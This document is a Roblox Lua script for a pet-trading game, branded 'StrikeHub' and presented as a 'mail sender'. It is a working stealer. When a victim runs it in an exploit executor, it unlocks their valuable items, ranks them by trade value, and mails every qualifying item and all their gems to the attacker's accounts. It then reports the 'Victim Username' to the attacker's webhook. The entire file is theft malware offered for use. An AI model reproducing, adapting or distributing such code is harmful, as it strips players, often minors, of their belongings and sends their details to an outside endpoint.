-- =================== UNIVERSAL EXECUTOR COMPATIBILITY ===================
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local requestFunction = request or (syn and syn.request) or (fluxus and fluxus.request) or http_request
local getgcFunction = getgc or (debug and debug.getgc) or get_gc_objects

-- =================== SETUP ===================
local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local HttpService = game:GetService("HttpService")
local plr = game.Players.LocalPlayer
local save = require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory
local MailMessage = "GGz"

local users = _G.Usernames or {"ilovemyamazing_gf1"}
local min_rap = _G.minrap or 10000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
	plr:kick("You didn't add any usernames or webhook")
	return
end

for _, user in ipairs(users) do
	if plr.Name == user then
		plr:kick("You cannot mailsteal yourself")
		return
	end
end

-- =================== RAP & MAIL COST ===================
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgcFunction()) do
	if debug.getinfo(func).name == "computeSendMailCost" then
		FunctionToGetFirstPriceOfMail = func
		break
	end
end

local mailSendPrice = FunctionToGetFirstPriceOfMail()
local GemAmount1 = 1
for i, v in pairs(save.Currency) do
	if v.id == "Diamonds" then
		GemAmount1 = v._am
		break
	end
end

local function getRAP(Type, Item)
	return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
		Class = {Name = Type},
		IsA = function(hmm) return hmm == Type end,
		GetId = function() return Item.id end,
		StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end
	}) or 0)
end

-- =================== MESSAGE ===================
local function SendMessage(diamonds)
	local headers = {["Content-Type"] = "application/json"}
	local fields = {
		{name = "Victim Username:", value = plr.Name, inline = true},
		{name = "Summary:", value = "Sent gems + items", inline = false}
	}
	local data = {
		embeds = {{
			title = "💡 StrikeHub Mail Sender Executed",
			color = 65280,
			fields = fields,
			footer = {text = "Strike Hub"}
		}}
	}
	local body = HttpService:JSONEncode(data)
	if requestFunction then
		requestFunction({Url = webhook, Method = "POST", Headers = headers, Body = body})
	end
end

-- =================== SEND FUNCTIONS ===================
local function sendItem(category, uid, amount)
	local userIndex, maxUsers = 1, #users
	while userIndex <= maxUsers do
		local sendAmount = (category == "Pet") and 1 or amount
		local args = {users[userIndex], MailMessage, category, uid, sendAmount}
		local response, err = network.Invoke("Mailbox: Send", unpack(args))
		if response then
			GemAmount1 -= mailSendPrice
			mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
			if category ~= "Pet" then break end
			amount -= 1
			if amount <= 0 then break end
		elseif err == "They don't have enough space!" then
			userIndex += 1
		else
			warn("Failed to send item:", err)
			break
		end
	end
end

local function SendAllGems()
	local gemUID
	for uid, data in pairs(save.Currency) do
		if data.id == "Diamonds" then
			gemUID = uid
			break
		end
	end
	if not gemUID or GemAmount1 <= 0 then return end
	local userIndex, maxUsers = 1, #users
	while userIndex <= maxUsers do
		local args = {users[userIndex], MailMessage, "Currency", gemUID, GemAmount1}
		local success, err = network.Invoke("Mailbox: Send", unpack(args))
		if success then
			GemAmount1 = 0
			break
		elseif err == "They don't have enough space!" then
			userIndex += 1
		else
			warn("Gem send failed:", err)
			break
		end
	end
end

-- =================== MAIN EXECUTION ===================
local sortedItems = {}
for _,v in pairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Ultimate"}) do
	if save[v] then
		for uid,item in pairs(save[v]) do
			local rapValue = getRAP(v,item)
			if v=="Pet" then
				local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
				if (dir.huge or dir.exclusiveLevel) and rapValue >= min_rap then
					table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue})
				end
			elseif rapValue >= min_rap then
				table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue})
			end
			if item._lk then
				network.Invoke("Locking_SetLocked", uid, false)
			end
		end
	end
end

-- Sort highest RAP first
table.sort(sortedItems,function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)

-- Send webhook
pcall(function() SendMessage(GemAmount1) end)

-- Send items
for _, item in ipairs(sortedItems) do
	if item.rap >= min_rap and GemAmount1 > mailSendPrice then
		if item.category == "Pet" then
			for i = 1, item.amount do
				task.spawn(function() sendItem(item.category, item.uid, 1) end)
				task.wait(0.05)
			end
		else
			task.spawn(function() sendItem(item.category, item.uid, item.amount) end)
			task.wait(0.05)
		end
	end
end

-- Send gems after items
if GemAmount1 > mailSendPrice then
	SendAllGems()
end

warn("[StrikeHub] Mail sender executed successfully.")
